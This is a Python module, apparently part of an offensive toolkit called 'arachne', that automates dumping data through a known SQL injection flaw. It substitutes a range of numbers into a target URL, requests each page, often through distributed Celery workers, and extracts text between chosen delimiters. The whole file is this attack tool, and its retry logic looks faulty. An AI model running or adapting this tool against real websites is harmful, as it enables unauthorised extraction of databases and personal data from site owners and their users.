from arachne.base import Chooser, InObject
from arachne.utils import celery_output
from arachne.browser import Browser
from arachne.celery import celery
from re import findall

name = 'sqli-dump'
def base_sqli_dump(num, browser_args, url, ident, left, right, attempts):
	b = Browser(url, **browser_args)

	r = b.go(url.replace(ident,str(num)))
	match = findall('{}(.*){}'.format(left,right), r.text)

	if match:
		return match[0]
	return attempts

@celery.task(name='arachne.scripts.sqli_dump')
def sqli_dump(num, browser_args, job_name, out_name, url, ident, left, right, attempts):
	out = base_sqli_dump(num, browser_args, url, ident, left, right, attempts)
	if type(out) == str:
		celery_output.delay(out, name, job_name, out_name)
		return

	if attempts - 1:
		base_sqli_dump.delay(num, browser_args, job_name, out_name, url, ident, left, right, attempts - 1)

class BaseSqliDump( Chooser ):
	def __init__(self):
		desc = 'Dumps desired output from SQLi vulnerability.  Output is delimited by left and right arguments'
		super(BaseSqliDump, self).__init__(name, desc, has_input=False)
		self.subparser.add_argument('-i', '--url', 
			help='URL to dump from, use IDENT for number to replace')
		self.subparser.add_argument('-l', '--left', 
			help='Left end of string seperating data to dump')
		self.subparser.add_argument('-r', '--right', 
			help='Right end of string seperating data to dump')
		self.subparser.add_argument('-d', '--ident', 
			help='Substring to replace in URL for number')
		self.subparser.add_argument('-s', '--start', type=int, default=0,
			help='Start dumping from number onwards')	
		self.subparser.add_argument('-e', '--end', type=int, 
			help='Stop dumping at this number')			
		self.subparser.add_argument('-a', '--attempts', type=int, default=4,
			help='If a match is not found, try again a couple of times')

	def init_common(self, cls, obj):
		cls.inn_base = inn_base
		obj.base_args += [
			obj.args.url,
			obj.args.ident,
			obj.args.left,
			obj.args.right,
			obj.args.attempts
		]

	def init_async(self, cls, obj):
		obj.core = sqli_dump

	def init_local(self, cls, obj):
		cls.out_format = out_format
		cls.dump_sqli = dump_sqli
		obj.phases = [obj.dump_sqli]
		obj.core = base_sqli_dump
		obj.in_object['attempts'] = obj.args.attempts

def out_format(self, item, out):
    return out

def inn_base(self):
	return [ i for i in xrange(self.args.start, self.args.end+1) ]

def dump_sqli(self, num_obj):
	try:
		out = base_sqli_dump(num_obj.item, *self.base_args)
	except Exception as e:
		return self.error_catch('dumping sqli', num_obj, e)

	if type(out) == str:
		return self.output.append(out)

	num_obj.attempts -= 1
	if num_obj.attempts:		
		self.add(num_obj)

def main():
	s = BaseSqliDump()
	s.start()

if __name__ == "__main__":
	main()